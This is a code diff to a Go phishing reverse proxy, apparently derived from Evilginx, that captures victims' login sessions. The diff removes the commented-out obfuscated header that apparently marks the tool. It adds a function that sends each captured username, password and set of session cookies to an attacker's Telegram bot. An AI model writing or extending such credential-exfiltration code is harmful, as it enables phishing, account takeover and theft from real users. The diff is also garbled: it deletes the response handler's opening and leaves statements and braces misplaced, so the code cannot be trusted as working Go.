@@ -547,32 +547,44 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				// e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
 				// for n, b := range e {
-				// 	e[n] = b ^ 0x88
-				// }
-				// req.Header.Set(string(e), e_host)
 
-				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-					s, ok := p.sessions[ps.SessionId]
-					if ok && !s.IsDone {
-						for _, au := range pl.authUrls {
-							if au.MatchString(req.URL.Path) {
-								s.IsDone = true
-								s.IsAuthUrl = true
-								break
-							}
-						}
-					}
-				}
-				// p.cantFindMe(req, e_host)
-			}
+if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+    s, ok := p.sessions[ps.SessionId]
+    if ok && !s.IsDone {
+        for _, au := range pl.authUrls {
+            if au.MatchString(req.URL.Path) {
+                s.IsDone = true
+                s.IsAuthUrl = true
+                break
+            }
+        }
+    }
+}
+// p.cantFindMe(req, e_host)
+}
+return req, nil
+} 
 
-			return req, nil
-		})
+func (p *HttpProxy) sendTelegramNotification(session *Session) {
+    if p.cfg.telegram.Enabled && session.Username != "" && session.Password != "" {
+        message := fmt.Sprintf("New session captured:\n\nUsername: %s\nPassword: %s\nCookies: %v", 
+            session.Username, session.Password, session.Tokens)
+        if err := telegram.SendMessage(p.cfg.telegram.BotToken, p.cfg.telegram.ChatID, message); err != nil {
+            log.Printf("Error sending Telegram notification: %v", err)
+        }
+    }
+}
 
-	p.Proxy.OnResponse().
-		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
-			if resp == nil {
-				return nil
+if pl != nil && ps.SessionId != "" {
+    s, ok := p.sessions[ps.SessionId]
+    if ok && s.IsDone {
+        if s.RedirectURL != "" && s.RedirectCount == 0 {
+            if stringExists(mime, []string{"text/html"}) {
+                p.sendTelegramNotification(s)
+            }
+        }
+    }
+}
 			}
 
 			// handle session
